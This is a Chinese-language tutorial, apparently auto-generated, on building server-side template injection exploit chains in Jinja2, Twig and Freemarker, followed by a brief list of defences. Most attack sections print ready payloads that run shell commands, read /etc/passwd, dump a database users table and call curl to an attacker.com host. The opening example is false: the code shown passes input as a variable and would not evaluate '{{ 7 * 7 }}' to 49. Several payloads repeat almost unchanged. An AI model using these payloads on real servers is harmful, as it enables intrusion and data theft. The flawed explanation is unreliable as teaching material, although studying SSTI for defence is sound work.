### 模板注入(SSTI)利用链构造的攻击技术

模板注入（Server-Side Template Injection, SSTI）是一种常见的Web安全漏洞，攻击者通过向服务器端模板引擎注入恶意代码，从而执行任意命令或获取敏感信息。模板注入利用链构造是指攻击者通过一系列精心设计的输入，逐步利用模板引擎的特性，最终实现攻击目标。本文将详细说明模板注入利用链构造的常见攻击手法和利用方式。

#### 1. 模板注入的基本原理

模板引擎通常用于将动态数据嵌入到静态模板中，生成最终的HTML页面。常见的模板引擎包括Jinja2（Python）、Twig（PHP）、Freemarker（Java）等。模板注入漏洞通常发生在用户输入被直接插入到模板中，而没有经过适当的过滤或转义。

例如，考虑以下Jinja2模板代码：

```python
from jinja2 import Template

template = Template("Hello, {{ name }}!")
print(template.render(name=user_input))
```

如果`user_input`是用户可控的输入，攻击者可以注入恶意代码，例如：

```python
user_input = "{{ 7 * 7 }}"
```

最终输出的结果将是`Hello, 49!`，这表明模板引擎执行了注入的表达式。

#### 2. 模板注入利用链构造的常见攻击手法

##### 2.1 表达式注入

表达式注入是模板注入的最基本形式，攻击者通过注入表达式来执行任意计算或操作。例如，在Jinja2中，攻击者可以注入以下代码来执行系统命令：

```python
user_input = "{{ ''.__class__.__mro__[1].__subclasses__()[216]('ls', shell=True) }}"
```

这段代码通过Python的反射机制，找到`subprocess.Popen`类并执行`ls`命令。

##### 2.2 对象属性访问

攻击者可以通过访问对象的属性来获取敏感信息或执行恶意操作。例如，在Twig中，攻击者可以注入以下代码来获取环境变量：

```twig
{{ app.request.server.get('ENV_VAR') }}
```

这段代码通过访问`app.request.server`对象，获取服务器环境变量。

##### 2.3 方法调用

攻击者可以通过调用对象的方法来执行任意操作。例如，在Freemarker中，攻击者可以注入以下代码来读取文件内容：

```freemarker
<#assign object="freemarker.template.utility.Execute"?new()> ${object("cat /etc/passwd")}
```

这段代码通过调用`Execute`类的构造函数，执行`cat /etc/passwd`命令。

##### 2.4 类加载与实例化

攻击者可以通过加载和实例化类来执行恶意代码。例如，在Jinja2中，攻击者可以注入以下代码来加载并实例化恶意类：

```python
user_input = "{{ ''.__class__.__mro__[1].__subclasses__()[216]('malicious_code', shell=True) }}"
```

这段代码通过加载`subprocess.Popen`类并实例化，执行恶意代码。

##### 2.5 利用内置函数和过滤器

模板引擎通常提供内置函数和过滤器，攻击者可以利用这些功能来执行恶意操作。例如，在Jinja2中，攻击者可以注入以下代码来执行Python代码：

```python
user_input = "{{ ''.__class__.__mro__[1].__subclasses__()[216]('python -c \"import os; os.system(\'ls\')\"', shell=True) }}"
```

这段代码通过调用`subprocess.Popen`类，执行Python代码并列出当前目录的文件。

#### 3. 模板注入利用链构造的利用方式

##### 3.1 信息泄露

攻击者可以通过模板注入获取敏感信息，例如服务器环境变量、配置文件内容、数据库连接信息等。例如，在Twig中，攻击者可以注入以下代码来获取服务器环境变量：

```twig
{{ app.request.server.get('ENV_VAR') }}
```

##### 3.2 远程代码执行

攻击者可以通过模板注入执行任意系统命令，从而完全控制服务器。例如，在Jinja2中，攻击者可以注入以下代码来执行`ls`命令：

```python
user_input = "{{ ''.__class__.__mro__[1].__subclasses__()[216]('ls', shell=True) }}"
```

##### 3.3 文件操作

攻击者可以通过模板注入读取、写入或删除文件。例如，在Freemarker中，攻击者可以注入以下代码来读取文件内容：

```freemarker
<#assign object="freemarker.template.utility.Execute"?new()> ${object("cat /etc/passwd")}
```

##### 3.4 数据库操作

攻击者可以通过模板注入执行数据库查询或操作。例如，在Jinja2中，攻击者可以注入以下代码来执行SQL查询：

```python
user_input = "{{ ''.__class__.__mro__[1].__subclasses__()[216]('sqlite3 /path/to/database.db \"SELECT * FROM users\"', shell=True) }}"
```

##### 3.5 网络请求

攻击者可以通过模板注入发起网络请求，例如发送HTTP请求或建立反向Shell连接。例如，在Jinja2中，攻击者可以注入以下代码来发送HTTP请求：

```python
user_input = "{{ ''.__class__.__mro__[1].__subclasses__()[216]('curl http://attacker.com', shell=True) }}"
```

#### 4. 防御措施

为了防止模板注入漏洞，开发人员应采取以下措施：

- **输入验证和过滤**：对所有用户输入进行严格的验证和过滤，确保输入内容符合预期格式。
- **输出编码**：在将用户输入插入到模板中时，进行适当的输出编码，防止恶意代码执行。
- **使用安全的模板引擎**：选择安全性较高的模板引擎，并确保使用最新版本，避免已知漏洞。
- **限制模板功能**：在模板引擎中禁用或限制危险的功能，例如执行系统命令或访问敏感对象。
- **最小权限原则**：在服务器上运行应用程序时，使用最小权限原则，限制应用程序的访问权限。

#### 5. 总结

模板注入（SSTI）利用链构造是一种复杂的攻击技术，攻击者通过精心设计的输入，逐步利用模板引擎的特性，最终实现攻击目标。常见的攻击手法包括表达式注入、对象属性访问、方法调用、类加载与实例化、利用内置函数和过滤器等。开发人员应采取严格的输入验证和过滤、输出编码、使用安全的模板引擎、限制模板功能和最小权限原则等防御措施，防止模板注入漏洞的发生。

---

*文档生成时间: 2025-03-11 17:38:15*






















